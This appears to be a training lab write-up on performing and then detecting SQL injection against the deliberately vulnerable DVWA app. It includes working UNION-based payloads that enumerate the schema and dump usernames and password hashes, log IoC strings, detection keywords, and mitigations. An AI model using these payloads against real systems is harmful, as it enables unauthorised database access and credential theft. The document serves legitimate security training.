# 🛡️ Assisted Lab: Performing and Detecting SQL Injection (DVWA)

## 📌 Overview
In this lab, I performed **SQL Injection (SQLi)** against the DVWA web application to demonstrate how unfiltered input can be used to manipulate backend **MySQL** queries. I followed an attacker workflow:

1) **Probe** the input for injection behavior (error-based SQLi)  
2) **Exploit** boolean logic to dump additional records  
3) **Enumerate** DBMS version, database/table names, and column names  
4) **Exfiltrate** sensitive data (usernames + password hashes)  
5) **Investigate** Apache logs on the LAMP server to identify **IoCs** and reconstruct the attack chain (threat hunting)

---

## 🎯 Objectives (CompTIA CySA+ Alignment)
- **1.1** Explain the importance of system and network architecture concepts in security operations  
- **1.2** Analyze indicators of potentially malicious activity  
- **1.3** Use appropriate tools/techniques to determine malicious activity  
- **1.4** Compare and contrast threat-intelligence and threat-hunting concepts  
- **2.4** Recommend controls to mitigate attacks and software vulnerabilities  
- **3.2** Perform incident response activities  
- **3.5** Explain concepts related to attack methodology frameworks  

---

## 🖥️ Environment

| Component | Details |
|---|---|
| Attacker VM | **KALI** (Kali Linux) |
| Target VM | **LAMP** (Ubuntu Server + Apache2 + MySQL) |
| Target App | **DVWA** (Security Level: Low) |
| Target URL | `http://dvwa.structureality.com` |
| Attack Surface | `/vulnerabilities/sqli/` |
| Logs Investigated | `/var/log/apache2/access.log` |

---

## 🔹 Phase 1 — SQLi Probing (Attacker View)

### Baseline behavior
- Entered `1` → returned admin account (normal behavior)
- Entered `7` → returned nothing (no error)

### Error-based SQLi confirmation
- Entered `'` (single quote) → MySQL syntax error shown  
This confirmed:
- **Metacharacters are not filtered**
- **DBMS = MySQL**
- The page is **SQLi vulnerable**

✅ **Lab Question:** *The result of injecting an alert command through script tags proves what?*  
(From prior XSS lab context, but for SQLi here the equivalent proof is:)  
**Answer:** The page is vulnerable to injection (SQLi) because input breaks query syntax and returns DBMS error details.

---

## 🔹 Phase 2 — Exploitation & Enumeration (Attacker View)

### Boolean-based dump
Payload:
```text
1' or '1'='1
Result: returned multiple accounts (dumped all rows)

✅ Lab Question: What user account name is NOT present in this SQLi result?
Answer: Gordon

Determine column count (ORDER BY)
Tested:

' ORDER BY 1# ✅ ok

' ORDER BY 2# ✅ ok

' ORDER BY 3# ❌ error (“Unknown column '3' in 'order clause'”)

Conclusion: 2 columns in the query output.

Identify DBMS version
text
Copy code
' UNION SELECT @@version, NULL#
Expected output: 8.0.31-0ubuntu0.20.04.1

Enumerate DVWA database tables
text
Copy code
' UNION SELECT table_schema, table_name FROM information_schema.tables#
✅ Lab Questions:

What is the first table name discovered from the DVWA database?
Answer: guestbook

What is the second table name discovered from the DVWA database?
Answer: users

Enumerate columns for users table (information_schema.columns)
text
Copy code
' UNION SELECT table_name, column_name FROM information_schema.columns#
✅ Lab Question: Which of the following are column names from the users table of the dvwa database? (Select eight)
Answer (8):

user_id

first_name

last_name

user

password

avatar

last_login

failed_login

Exfiltrate usernames + password hashes
text
Copy code
' UNION SELECT user, password FROM users#
Optional: combine columns using CONCAT for richer dumps:

text
Copy code
' UNION SELECT CONCAT(user, ' ', avatar), password FROM users#
🔹 Phase 3 — Investigate SQLi (Threat Hunting)
Log review location (LAMP)
bash
Copy code
sudo su
cd /var/log/apache2
less access.log
Key IoCs observed
Percent-encoded quotes and SQL keywords in query string

Patterns of enumeration: ORDER BY → UNION SELECT → information_schema → users dump

Multiple sequential requests with referrer chaining (attacker iterating based on returned info)

✅ Lab Question: What is the HTTP referrer for the log record related to your first submission to the SQLi page of just the number '1'?
Answer: "GET /vulnerabilities/sqli/"

✅ Lab Question: What could be found in a website's access log as a representation of a space in an HTTP request? (Select 2)
Answer: + (a plus sign) and %20

✅ Lab Question: What is the percent-encoding for a single quotation mark?
Answer: %27

✅ Lab Question: Why is the octothorpe (#) after the NULL parameter used in the SQLi statement?
Answer: end-of-line comment

🔍 Indicators of Compromise (IoCs)
SQLi IoCs in access.log
Common signatures observed in requests:

%27 (single quote)

ORDER+BY

UNION+SELECT

information_schema.tables

information_schema.columns

@@version

FROM+users

CONCAT(

Example high-confidence SQLi requests:

id=1%27+or+%271%27%3D%271...

id=%27+ORDER+BY+1%23...

id=%27+UNION+SELECT+table_schema%2C+table_name+FROM+information_schema.tables%23...

id=%27+UNION+SELECT+user%2C+password+FROM+users%23...

🛡️ Recommendations & Mitigations (2.4)
Prevention
Use parameterized queries / prepared statements (no string concatenation)

Enforce input validation (type checks: User ID must be numeric)

Suppress DBMS error output to users (disable verbose SQL errors in production)

Apply least privilege to the DB account used by the web app (no schema read unless needed)

Use a WAF rule set for SQLi patterns as defense-in-depth

Detection
Alert on URLs containing:

UNION, SELECT, ORDER BY, information_schema, @@version, CONCAT

high-frequency sequential requests with progressive payload changes

Centralize logs into SIEM (Splunk/Sentinel) and correlate with:

spikes in 4xx/5xx

unusual user agents

abnormal request volume per source IP
